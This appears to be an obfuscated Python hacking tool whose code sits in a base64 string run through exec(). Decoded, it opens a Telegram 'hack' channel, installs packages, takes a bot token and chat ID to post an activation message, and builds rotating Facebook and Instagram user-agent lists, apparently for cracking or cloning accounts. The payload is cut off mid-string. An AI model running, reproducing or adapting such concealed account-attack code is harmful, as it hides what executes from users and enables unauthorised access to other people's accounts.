#https://t.me/x778l
#x778l
import base64
exec(base64.b64decode('IyBEZUNvRGUgQnkgQFRUTDlUCmltcG9ydCB3ZWJicm93c2VyCm5hID0gd2ViYnJvd3Nlci5vcGVuKCdodHRwczovL3QubWUvaGFja2ZoZycpCmltcG9ydCByZXF1ZXN0cwppbXBvcnQgYnM0CmltcG9ydCBqc29uCmltcG9ydCBvcwppbXBvcnQgc3lzCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmltcG9ydCB0aW1lCmltcG9ydCByZQppbXBvcnQgdXJsbGliMwppbXBvcnQgcmljaAppbXBvcnQgYmFzZTY0CmZyb20gcmljaC50YWJsZSBpbXBvcnQgVGFibGUgYXMgbWUKZnJvbSByaWNoLmNvbnNvbGUgaW1wb3J0IENvbnNvbGUgYXMgc29sCmZyb20gYnM0IGltcG9ydCBCZWF1dGlmdWxTb3VwIGFzIHNvcApmcm9tIGJzNCBpbXBvcnQgQmVhdXRpZnVsU291cCBhcyBwYXJzZXIKZnJvbSBjb25jdXJyZW50LmZ1dHVyZXMgaW1wb3J0IFRocmVhZFBvb2xFeGVjdXRvciBhcyB0cmVkCmZyb20gcmljaC5jb25zb2xlIGltcG9ydCBHcm91cCBhcyBncApmcm9tIHJpY2gucGFuZWwgaW1wb3J0IFBhbmVsIGFzIG5lbApmcm9tIHJpY2ggaW1wb3J0IHByaW50IGFzIGNldGFrCmZyb20gcmljaC5tYXJrZG93biBpbXBvcnQgTWFya2Rvd24gYXMgbWFyawpmcm9tIHJpY2guY29sdW1ucyBpbXBvcnQgQ29sdW1ucyBhcyBjb2wKZnJvbSByaWNoIGltcG9ydCBwcmludCBhcyBycHJpbnQKZnJvbSByaWNoIGltcG9ydCBwcmV0dHkKZnJvbSByaWNoLnRleHQgaW1wb3J0IFRleHQgYXMgdGVregppbXBvcnQgb3MKbm93ID0gZGF0ZXRpbWUuZGF0ZXRpbWUudG9kYXkoKQpub3cgPSBkYXRldGltZS5kYXRldGltZS50b2RheSgpCm1tID0gc3RyKG5vdy5tb250aCkKZGQgPSBzdHIobm93LmRheSkKeXl5eSA9IHN0cihub3cueWVhcikKaG91ciA9IHN0cihub3cuaG91cikKbWkgPSBzdHIobm93Lm1pbnV0ZSkKc3MgPSBzdHIobm93LnNlY29uZCkKdCA9IG1tICsgJy8nICsgZGQgKyAnLycgKyB5eXl5ICsgJyAnICsgaG91ciArICc6JyArIG1pICsgJzonICsgc3MKaG91cnMgPSBub3cuaG91cgp4ID0gZGF0ZXRpbWUuZGF0ZXRpbWUubm93KCkKZyA9IGRhdGV0aW1lLmRhdGV0aW1lKDIwMjMsIDExLCA3LCAyLCAwLCAwKQojIGlmIHguc3RyZnRpbWUoJyV4JykgPiBnLnN0cmZ0aW1lKCcleCcpOgogICAgIyBwcmludCgnXG5cbicpCiAgICAjIHByaW50KCcgICAgINiq2YUg2KrZiNmC2YrZgSDYp9iv2KfYqSDYsdin2LPZhCDYp9mE2YXYt9mI2LEg2YTYqtmB2LnZitmE2Ycg2KfZhNmF2K/ZgdmI2LkgQFRUTDlUJykKICAgICMgcHJpbnQoJ1xuXG4nKQogICAgIyBwcmludCh4KQogICAgIyBzeXMuZXhpdCgwKQojIGlmIHguc3RyZnRpbWUoJyV4JykgPT0gZy5zdHJmdGltZSgnJXgnKToKICAgICMgcHJpbnQoJycpCiAgICAjIGlmIHguc3RyZnRpbWUoJyVYJykgPiBnLnN0cmZ0aW1lKCclWCcpOgogICAgICAgICMgcHJpbnQoJ1xuXG4nKQogICAgICAgICMgcHJpbnQoJyAgICAg2KfZhtiq2YfZiSDZiNmC2Kog2KrZgdi52YrZhCDYp9mE2KfYr9in2Kkg2YTZhNin2LTYqtix2KfZgyDYp9mE2YXYr9mB2YjYuSDYsdin2LPZhCDYp9mE2YXYt9mI2LEgQFRUTDlUJykKICAgICAgICAjIHByaW50KCdcblxuJykKICAgICAgICAjIHByaW50KHgpCiAgICAgICAgIyBzeXMuZXhpdCgwKQogICAgIyBlbHNlOgogICAgICAgICMgcHJpbnQoJycpCiMgZWxzZToKICAgICMgcHJpbnQoJycpCgp0cnk6CiAgICBpbXBvcnQgcmljaApleGNlcHQ6CiAgICBjZXRhayhuZWwoJ1x04oCiIFNlZGFuZyBNZW5naW5zdGFsbCBNb2R1bCBSaWNoIOKAoicpKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCByaWNoJykKCnRyeToKICAgIGltcG9ydCBzdGRpb21hc2sKZXhjZXB0OgogICAgY2V0YWsobmVsKCdcdOKAoiBTZWRhbmcgTWVuZ2luc3RhbGwgTW9kdWwgU3RkaW9tYXNrIOKAoicpKQogICAgb3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBzdGRpb21hc2snKQoKdHJ5OgogICAgaW1wb3J0IHJlcXVlc3RzCmV4Y2VwdDoKICAgIFogPSAnXHgxYlsxOzMxbScKUiA9ICdceDFiWzE7MzFtJwpYID0gJ1x4MWJbMTszM20nCkYgPSAnXHgxYlsyOzMybScKQyA9ICdceDFiWzE7OTdtJwpCID0gJ1x4MWJbMjszNm0nClkgPSAnXHgxYlsxOzM0bScKRSA9ICdceDFiWzE7MzFtJwpCID0gJ1x4MWJbMjszNm0nCkcgPSAnXHgxYlsxOzMybScKUyA9ICdceDFiWzE7MzNtJwoKdHJ5OgogICAgZnJvbSBjZm9udHMgaW1wb3J0IHJlbmRlciwgc2F5CmV4Y2VwdDoKICAgIG9zLnN5c3RlbSgncGlwIGluc3RhbGwgcHl0aG9uLWNmb250cycpCnByaW50KCgn4oCUJyoyNSkrJ1xu4oCiIERlQ29EZSBCeSBAVFRMOVQg4oCiXG4nKygn4oCUJyoyNSkpCm91dHB1dCA9IHJlbmRlcignWSBBIFMgSSBSJywgY29sb3JzPVsncmVkJywgJ2dyZWVuJ10sIGFsaWduPSdjZW50ZXInKQpwcmludChvdXRwdXQpCnByaW50KCgn4oCUJyoyNSkrJ1xu4oCiIERlQ29EZSBCeSBAVFRMOVQg4oCiXG4nKygn4oCUJyoyNSkpCnByaW50KCdcbicpCnRva2VuID0gaW5wdXQoJ1x4MWJbMTszMW1UXHgxYlsxOzMybU9ceDFiWzE7MzNtS1x4MWJbMTszNG1FXHgxYlsxOzM2bU5ceDFiWzE7MzVtIDpceDFiWzE7MzJtICcpCnByaW50KCdcbicpCklEID0gaW5wdXQoJ1x4MWJbMTszMW1JXHgxYlsxOzM0bUQgXHgxYlsxOzMybSAgIDogJykKcHJpbnQoKCfigJQnKjI1KSsnXG7igKIgRGVDb0RlIEJ5IEBUVEw5VCDigKJcbicrKCfigJQnKjI1KSkKdGxnMSA9ICdcbvCdmobwnZm08J2Zu/CdmbLwnZm+8J2ZvPCdmbQgLdmF2LHYrdioINio2YMg2YHZiiDYp9iv2KfYqSDYp9mE2YXYt9mI2LEg2K3Ys9mGXG7wk4WD4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4p2W4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB4pSB8JOFg1xu8J2Zv/CdmbvwnZm08J2ZsPCdmoLwnZm0IPCdmobwnZmw8J2ZuPCdmoMgIOKeqSBcbtiq2YUg2KrYtNi62YrZhCDYp9mE2KfYr9in2Kkg2KfZhNmF2K/ZgdmI2LnZh1xuICAgIFxu2YTYpyDYqtmA2YbYs9mJINin2YYg2KrZgNix2LPZhCDYtdmA2YjYsSDYp9mE2YDYtdmK2K8gLSAgQFRUTDlUXG5cbvCThYPilIHilIHilIHilIHilIHilIHilIHilIHinZbilIHilIHilIHilIHilIHilIHilIHilIHilIHwk4WDICcKcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JyArIHN0cih0b2tlbikgKyAnL3NlbmRNZXNzYWdlP2NoYXRfaWQ9JyArIHN0cihJRCkgKyAnJnRleHQ9JyArIHN0cih0bGcxKSkKb3Muc3lzdGVtKCdjbGVhcicpCm9zLnN5c3RlbSgnY2xlYXInKQpjZXRhayhuZWwoJ1x04oCiIFNlZGFuZyBNZW5naW5zdGFsbCBNb2R1bCBSZXF1ZXN0cyDigKInKSkKcHJldHR5Lmluc3RhbGwoKQpDT04gPSBzb2woKQp1c2VyX2FnZW50PVsnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDcuMDsgUmVkbWkgTm90ZSA0IEJ1aWxkL05SRDkwTTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS85Ni4wLjQ2NjQuNDUgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCX0lBQi9GQjRBO0ZCQVYvMzQ1LjAuMC4zNC4xMTg7XScsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk4LjAuNDc1OC4xMDEgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNy4wOyBSZWRtaSBOb3RlIDQgQnVpbGQvTlJEOTBNOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzcwLjAuMzUzOC44MCBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8xOTguMC4wLjUzLjEwMTtdJywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTTS1BMjA1VSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk4LjAuNDc1OC4xMDEgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNNLUExMDJVKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTguMC40NzU4LjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgU00tRzk2MFUpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85OC4wLjQ3NTguMTAxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTTS1OOTYwVSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk4LjAuNDc1OC4xMDEgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IExNLVE3MjApIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85OC4wLjQ3NTguMTAxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBMTS1YNDIwKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTguMC40NzU4LjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgU0FNU1VORyBTTS1HNzgwRykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgU2Ftc3VuZ0Jyb3dzZXIvMTYuMCBDaHJvbWUvOTIuMC40NTE1LjE2NiBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgTE0tUTcxMChGR04pKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTguMC40NzU4LjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMTsgUmVkbWkgTm90ZSA5IEJ1aWxkL1JRMkEuMjEwMzA1LjAwNjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS84My4wLjQxMDMuMTA2IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSZWRtaSBOb3RlIDcgQnVpbGQvUUtRMS4xOTA5MTAuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzEwOS4wLjU0MTQuMTE3IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSZWRtaSBOb3RlIDcgQnVpbGQvUUtRMS4xOTA5MTAuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzExMC4wLjU0ODEuNjUgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgOTsgUmVkbWkgTm90ZSA3IEJ1aWxkL1BLUTEuMTgwOTA0LjAwMTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8xMDkuMC41NDE0LjExOCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgUmVkbWkgTm90ZSA3IEJ1aWxkL1FLUTEuMTkwOTEwLjAwMjsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8xMDguMC41MzU5LjEyOCBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCAxMDsgZW4tdXM7IFJlZG1pIE5vdGUgNyBCdWlsZC9RS1ExLjE5MDkxMC4wMDIpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8xMDAuMC40ODk2LjEyNyBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCAxMDsgemgtY247IFJlZG1pIE5vdGUgNyBCdWlsZC9RS1ExLjE5MDkxMC4wMDIpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS8xMDAuMC40ODk2LjEyNyBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA5OyBlbi1VUzsgUmVkbWkgOEEgUHJvIEJ1aWxkL1BLUTEuMTkwMzE5LjAwMSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzU3LjAuMjk4Ny4xMDggVUNCcm93c2VyLzEyLjEyLjkuMTIyNiBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA5OyBSZWRtaSA4QSBQcm8gQnVpbGQvUEtRMS4xOTAzMTkuMDAxOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzgwLjAuMzk4Ny45OSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBPUFIvNTAuMC4yMjU0LjE0OTE4MycsJ01vemlsbGEvNS4wIChMaW51eDsgVTsgQW5kcm9pZCA5OyBlbi11czsgUmVkbWkgTm90ZSA4IEJ1aWxkL1BLUTEuMTkwNjE2LjAwMSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg5LjAuNDM4OS4xMTYgTW9iaWxlIFNhZmFyaS81MzcuMzYgWGlhb01pL01pdWlCcm93c2VyLzE2LjcuMjcgc3dhbi1taWJyb3dzZXInLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgNy4wOyBSZWRtaSBOb3RlIDQgQnVpbGQvTlJEOTBNOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzk2LjAuNDY2NC40NSBNb2JpbGUgU2FmYXJpLzUzNy4zNiBbRkJfSUFCL0ZCNEE7RkJBVi8zNDUuMC4wLjM0LjExODtdJywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTguMC40NzU4LjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IFJlZG1pIE5vdGUgNCBCdWlsZC9OUkQ5ME07IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNzAuMC4zNTM4LjgwIE1vYmlsZSBTYWZhcmkvNTM3LjM2IFtGQl9JQUIvRkI0QTtGQkFWLzE5OC4wLjAuNTMuMTAxO10nLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNNLUEyMDVVKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTguMC40NzU4LjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgU00tQTEwMlUpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85OC4wLjQ3NTguMTAxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTTS1HOTYwVSkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk4LjAuNDc1OC4xMDEgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IFNNLU45NjBVKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTguMC40NzU4LjEwMSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgTE0tUTcyMCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzk4LjAuNDc1OC4xMDEgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTI7IExNLVg0MjApIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85OC4wLjQ3NTguMTAxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBTQU1TVU5HIFNNLUc3ODBHKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBTYW1zdW5nQnJvd3Nlci8xNi4wIENocm9tZS85Mi4wLjQ1MTUuMTY2IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEyOyBMTS1RNzEwKEZHTikpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS85OC4wLjQ3NTguMTAxIE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDExOyBSZWRtaSBOb3RlIDkgQnVpbGQvUlEyQS4yMTAzMDUuMDA2OyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzgzLjAuNDEwMy4xMDYgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFJlZG1pIE5vdGUgNyBCdWlsZC9RS1ExLjE5MDkxMC4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTA5LjAuNTQxNC4xMTcgTW9iaWxlIFNhZmFyaS81MzcuMzYnLCdNb3ppbGxhLzUuMCAoTGludXg7IEFuZHJvaWQgMTA7IFJlZG1pIE5vdGUgNyBCdWlsZC9RS1ExLjE5MDkxMC4wMDI7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvMTEwLjAuNTQ4MS42NSBNb2JpbGUgU2FmYXJpLzUzNy4zNicsJ01vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA5OyBSZWRtaSBOb3RlIDcgQnVpbGQvUEtRMS4xODA5MDQuMDAxOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzEwOS4wLjU0MTQuMTE4IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSZWRtaSBOb3RlIDcgQnVpbGQvUUtRMS4xOTA5MTAuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzEwOC4wLjUzNTkuMTI4IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDEwOyBlbi11czsgUmVkbWkgTm90ZSA3IEJ1aWxkL1FLUTEuMTkwOTEwLjAwMikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzEwMC4wLjQ4OTYuMTI3IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDEwOyB6aC1jbjsgUmVkbWkgTm90ZSA3IEJ1aWxkL1FLUTEuMTkwOTEwLjAwMikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzEwMC4wLjQ4OTYuMTI3IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDk7IGVuLVVTOyBSZWRtaSA4QSBQcm8gQnVpbGQvUEtRMS4xOTAzMTkuMDAxKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvNTcuMC4yOTg3LjEwOCBVQ0Jyb3dzZXIvMTIuMTIuOS4xMjI2IE1vYmlsZSBTYWZhcmkvNTM3LjM2JywnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDk7IFJlZG1pIDhBIFBybyBCdWlsZC9QS1ExLjE5MDMxOS4wMDE7IHd2KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODAuMC4zOTg3Ljk5IE1vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi81MC4wLjIyNTQuMTQ5MTgzJywnTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDk7IGVuLXVzOyBSZWRtaSBOb3RlIDggQnVpbGQvUEtRMS4xOTA2MTYuMDAxKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODkuMC40Mzg5LjExNiBNb2JpbGUgU2FmYXJpLzUzNy4zNiBYaWFvTWkvTWl1aUJyb3dzZXIvMTYuNy4yNyBzd2FuLW1pYnJvd3NlciddCnVhc19iYXdhYW4gPSAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBNaSA5VCBQcm8gQnVpbGQvUUtRMS4xOTA4MjUuMDAyOyB3dikgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgVmVyc2lvbi80LjAgQ2hyb21lLzg4LjAuNDMyNC4xODEgTW9iaWxlIFNhZmFyaS81MzcuMzYgW0ZCQU4vRU1BO0ZCTEMvaWRfSUQ7RkJBVi8yMzkuMC4wLjEwLjEwOTtdIgp1YXNfbm9raWFjMiA9ICJOb2tpYUMyLTAwLzIuMCAoMDMuNDUpIFByb2ZpbGUvTUlEUC0yLjEgQ29uZmlndXJhdGlvbi9DTERDLTEuMSBNb3ppbGxhLzUuMCAoSmF2YTsgVTsga2F1OyBub2tpYWMyLTAwKSBVQ0Jyb3dzZXI4LjMuMC4xNTQvNzAvMzUyL1VDV0VCIE1vYmlsZSIKdWFzX25va2lheDIwID0gIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgTm9raWEgWDIwIEJ1aWxkL1NLUTEuMjEwODIxLjAwMTsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIHNlcGVydGkgR2Vja28pIFZlcnNpLzQuMCBDaHJvbWUvOTguMC40NzU4Ljg3IE1vYmlsZSBTYWZhcmkvNTM3LjM2Igp1YXNfbm9raWF4ID0gIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA0LjEuMjsgTm9raWFfWCBCdWlsZC9KWk81NEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8yNy4wLjg3LjkwIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE5va2lhQnJvd3Nlci8xLjAsZ3ppcChnZmUpIgp1YXNfc2Ftc3VuZ3NlID0gIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMjsgU0FNU1VORyBTTS1HNzgwRykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgU2Ftc3VuZ0Jyb3dzZXIvMTYuMCBDaHJvbWUvOTIuMC40NTE1LjE2NiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIKdWFzX3JlZG1pOWEgPSAiTW96aWxsYS81LjAgKExpbnV4OyBVOyBBbmRyb2lkIDEwOyBpZC1pZDsgUmVkbWkgOUEgQnVpbGQvUVAxQS4xOTA3MTEuMDIwKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBWZXJzaW9uLzQuMCBDaHJvbWUvODkuMC40Mzg5LjExNiBNb2JpbGUgU2FmYXJpLzUzNy4zNiIKdWFzX25va2lheGwgPSAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDQuMS4yOyBOb2tpYV9YTCBCdWlsZC9KWk81NEspIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8zMC4wLjE1OTkuODIgTW9iaWxlIFNhZmFyaS81MzcuMzYgTm9raWFCcm93c2VyLzEuMi4wLjEyIgp1YXNfY2hyb21lbGludXggPSAiTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvOTcuMC40NjkyLjcxIFNhZmFyaS81MzcuMzYiCnVhc19qN3ByaW1lID0gIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA4LjEuMDsgU00tRzYxMEYgQnVpbGQvTTFBSlEpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS83Mi4wLjM2MjYuMTIxIE1vYmlsZSBTYWZhcmkvNTM3LjM2IE9QUi81MS4xLjI0NjEuMTM3NTAxIgp1YXNfdGVzID0gIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCA3LjA7IFJlZG1pIE5vdGUgNFggQnVpbGQvTWlVSSBNUzsgd3YpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIFZlcnNpb24vNC4wIENocm9tZS82NS4wLjMzMjUuMTA5IE1vYmlsZSBTYWZhcmkvNTM3LjM2IEluc3RhZ3JhbSAzOC4wLjAuMTMuOTUgQW5kcm9pZCAoMjQvNy4wOyA0ODBkcGk7IDEwODB4MTkyMDsgWGlhb21pL3hpYW9taTsgUmVkbWkgTm90ZSA0WDsgbWl